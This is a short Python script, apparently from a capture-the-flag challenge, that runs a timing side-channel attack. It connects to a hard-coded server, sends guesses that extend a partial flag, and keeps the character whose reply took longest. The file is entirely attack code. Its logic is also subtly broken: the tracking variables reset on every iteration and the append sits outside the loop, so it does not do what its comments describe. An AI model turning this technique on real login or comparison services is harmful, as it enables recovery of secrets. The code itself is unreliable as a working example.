import time
import socket

# Server details
HOST = '103.28.91.24'
PORT = 10025

# Known part of the flag (initially empty)
known_flag = "3108{s1mpl3_p3n3t"

# Target string length
target_length = 7

# Create a socket connection to the server
def send_payload(payload):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.recv(1024)
        start_time = time.time()
        s.sendall(payload.encode())
        s.recv(1024)
        end_time = time.time()
    return end_time - start_time

# Iterate over the length of the flag
# for i in range(target_length):
for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/`~":
    test_string = known_flag + c
    max_duration = 0
    best_char = ''
    
    # Send payload and measure response time
    varsum = 0.0
    for i in range(3):
        duration = send_payload(test_string)
        varsum += duration
    
    avgtime = varsum/3
    # Print the response time
    print(f"Response time for '{test_string}': {avgtime:.5f} seconds")
    
    # Keep track of the character with the highest response time
    if avgtime > max_duration:
        max_duration = avgtime
        best_char = c
    
    # Add the character with the highest response time to known_flag
known_flag += best_char
print(f"Character added to known_flag: {best_char}, Current known_flag: {known_flag}")
